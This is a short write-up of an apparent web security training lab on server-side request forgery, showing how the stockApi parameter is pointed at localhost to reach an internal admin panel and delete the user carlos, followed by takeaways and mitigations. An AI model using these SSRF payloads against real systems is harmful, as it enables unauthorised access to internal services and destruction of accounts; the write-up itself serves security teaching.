# Basic SSRF Against Localhost

## 📌 Lab Objective
Exploit an SSRF vulnerability to access the internal admin interface and delete user `carlos`.

---

## 🧠 Vulnerability Overview

Server-Side Request Forgery (SSRF) occurs when an application fetches a remote resource without properly validating user-supplied URLs.

In this lab, the `stockApi` parameter allows user-controlled URLs, enabling internal resource access.

---

## 🔎 Entry Point

POST request:

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1

The application fetches the URL server-side.

---

## 🧪 Exploitation Steps

### Step 1: Confirm SSRF

Replaced stockApi value with:

http://localhost/admin

Server returned admin panel HTML.

---

### Step 2: Delete User

Modified request to:

http://localhost/admin/delete?username=carlos

Lab marked as solved.

---

## 🎯 Key Takeaways

- SSRF allows access to internal services
- Localhost is often exposed internally
- Admin panels are common internal targets
- Always test 127.0.0.1 and localhost

---

## 🔐 Mitigation

- Whitelist allowed domains
- Block internal IP ranges
- Disable unnecessary URL fetching
- Use network-level egress filtering

---
